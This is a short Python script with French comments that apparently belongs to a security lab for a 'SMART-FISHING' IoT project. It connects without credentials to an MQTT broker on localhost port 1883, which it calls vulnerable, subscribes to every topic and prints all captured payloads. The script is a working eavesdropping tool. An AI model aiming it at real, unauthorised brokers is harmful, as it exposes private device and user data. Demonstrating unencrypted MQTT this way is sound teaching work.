#!/usr/bin/env python3
"""
Script de Sniffing MQTT — SMART-FISHING
Capture le trafic MQTT en clair sur le port 1883
"""

import paho.mqtt.client as mqtt
import json
import time

# Configuration du broker vulnérable
BROKER = "localhost"
PORT = 1883

# Topics à surveiller (wildcard # = tous les topics)
TOPICS = "#"

def on_connect(client, userdata, flags, rc):
    """Callback lors de la connexion au broker"""
    if rc == 0:
        print("[+] Connecté au broker vulnérable sur le port 1883 ✅")
        print("[*] Sniffing en cours... (Appuyez sur Ctrl+C pour arrêter)")
        client.subscribe(TOPICS)
    else:
        print(f"[-] Échec de connexion, code: {rc}")

def on_message(client, userdata, msg):
    """Callback lors de la réception d'un message MQTT"""
    print(f"[S] Topic: {msg.topic}")
    try:
        payload = json.loads(msg.payload.decode())
        print(f"[D] Payload: {json.dumps(payload, indent=2)}")
    except:
        print(f"[D] Payload: {msg.payload.decode()}")
    print("-" * 50)

def on_disconnect(client, userdata, rc):
    """Callback lors de la déconnexion"""
    print("[+] Déconnecté du broker")

# Créer le client
client = mqtt.Client()
client.on_connect = on_connect
client.on_message = on_message
client.on_disconnect = on_disconnect

# Se connecter au broker vulnérable
print("[*] Connexion au broker vulnérable...")
client.connect(BROKER, PORT, 60)

try:
    client.loop_forever()
except KeyboardInterrupt:
    print("\n[+] Arrêt du sniffing")
    client.disconnect()
